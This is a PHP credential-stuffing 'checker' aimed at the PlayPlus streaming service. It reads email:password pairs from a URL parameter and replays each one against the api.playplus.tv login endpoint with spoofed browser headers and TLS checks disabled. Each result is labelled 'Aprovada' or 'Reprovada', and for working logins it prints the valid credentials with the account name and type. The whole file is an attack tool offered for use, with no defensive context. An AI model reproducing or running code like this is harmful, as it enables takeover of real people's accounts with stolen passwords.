<?php 
error_reporting(0);
function GetStr($string, $start, $end){
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}
function multiexplode($delimiters, $string) {
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return $launch;
}

	$lista = $_GET['lista'];
	$explode = multiexplode(array(";", "»", "|", ":", " ", "/"), $lista);
	$explode = array_values(array_filter($explode));
	@$email = trim($explode[0]);
	@$senha = trim($explode[1]);
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.playplus.tv/api/web/login');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch,CURLOPT_CUSTOMREQUEST,'PUT');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.playplus.tv',
'accept: application/json, text/plain, */*',
'origin: https://www.playplus.com',
'user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-G600FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
'content-type: application/json',
'referer: https://www.playplus.com/login',

'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
));
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch,CURLOPT_POSTFIELDS,
'{
  "email": "'. $email.'",
  "password": "'. $senha.'"
}'
);

$ex = curl_exec($ch);



$nome = getstr ($ex,'"name":"','"');
$tipo = getstr ($ex,'"type":"','"');
$status = getstr ($ex,'"status":"','"');
$token = getstr ($ex,'"token":"','"');
$res = getstr ($ex,'{"errorMessage":"','"');

if (strpos ($res,'Não autorizado')!==false){
	
	echo "<span style ='background-color:red; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600'>Reprovada</span> <span style='color:red;'> EMAIL: $email SENHA:$senha  Retorno: Email ou senha incorreto</span>";

}else {



	echo"<br><span style='background: linear-gradient(to right, rgb(244, 238, 66) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);
	; color: black; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'>Aprovada</span><span style='color:white'>  EMAIL: $email  SENHA:$senha </span><span class='label label-info' style='color: white'> Informações [ NOME: $nome  TIPO: $tipo ]</span> <span style='background: linear-gradient(to right, rgb(244, 238, 66) 0%, rgb(220, 244, 66)0%, rgb(66, 244, 235) 100%);, whiteolor: white; padding: 4px 5px; border-radius: 2px; font-size: 10px; font-weight: 600;'>#Central_Black</span>";
}



?>